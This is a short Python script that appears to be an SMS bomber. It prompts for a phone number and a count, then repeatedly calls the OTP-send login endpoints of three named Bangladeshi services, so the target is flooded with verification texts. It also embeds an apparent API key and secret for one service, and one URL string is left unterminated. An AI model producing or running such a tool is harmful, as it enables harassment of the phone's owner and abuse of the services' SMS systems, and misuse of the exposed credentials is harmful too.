import requests
from requests.structures import CaseInsensitiveDict
import os 

R = '\033[1;31m'
G = '\033[1;32m'
Y = '\033[1;33m'
C = '\033[1;36m'
W = '\033[1;37m'

os.system("python2 logo.py")

number=str(input(C + "Enter Your Number: "))

amount=int(input(C + "Enter Amount: "))
#1 

binge1 = "https://ss.binge.buzz/otp/send/login"

headers1 = CaseInsensitiveDict()
headers1["Content-Type"] = "application/x-www-form-urlencoded"

data1 = "phone="+number

#2 

url = "https://api.daktarbhai.com/api/v2/otp/generate?=&api_key=BUFWICFGGNILMSLIYUVH&api_secret=WZENOMMJPOKHYOMJSPOGZNAGMPAEZDMLNVXGMTVE&mobile=%2B88"+number+"&platform=app&activity=login"

headers2 = CaseInsensitiveDict()
headers2["Content-Type"] = "application/x-www-form-urlencoded"
headers2["Content-Length"] = "0"

#3 
api="https://stage.bioscopelive.com/en/login/send-otp?phone=88"+number+"&operator=bd-otp


for j in range(amount):
    resp = requests.post(binge1, headers=headers1, data=data1)
    resp1 = requests.post(url, headers=headers2)
    requests.get(api)
    
    print(G + "[✓]"+str(j+1)+" SMS Sent Successful...")
